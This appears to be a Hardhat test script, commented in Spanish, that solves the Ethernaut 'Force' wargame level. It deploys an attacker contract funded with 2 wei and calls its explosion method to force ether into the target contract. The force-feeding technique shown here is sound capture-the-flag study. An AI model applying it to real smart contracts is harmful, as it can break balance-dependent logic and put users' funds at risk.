import { expect } from "chai";
import { ethers } from "hardhat";
import { Contract, Signer } from "ethers";
import { createChallenge, submitLevel } from "./utils";
import { Interface } from "ethers/lib/utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract;
const LEVEL_ADDRESS = "0x22699e6AdD7159C3C385bf4d7e1C647ddB3a99ea";

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  //Contrato del challenge
  const challengeFactory = await ethers.getContractFactory(`Force`);
  const challengeAddress = await createChallenge(
    LEVEL_ADDRESS
  );
  challenge = challengeFactory.attach(challengeAddress);

  //Contrato atacante (Si fuera necesario)
  const attackerFactory = await ethers.getContractFactory(`Voltorb`);
  attacker = await attackerFactory.deploy({ value: 2 });
});

describe("Force Challenge", async () => {
  it("Resuelve el challenge - Force", async () => {

    console.log("VOLTORB YO TE ELIJO!");
    let txExplosion = await attacker.explosion(challenge.address);
    await txExplosion.wait();
    console.log("KABOOM! EXPLOSIÓN REALIZADA");


    // let balanceDelChallenge = await ethers.provider.getBalance(challenge.address);
    // expect(balanceDelChallenge,"EL CONTRATO NO AUMENTÓ SU BALANCE").to.be.greaterThan(0);
  });
});

after(async () => {
  expect(await submitLevel(challenge.address), "DESAFÍO INCOMPLETO").to.be.true;
});
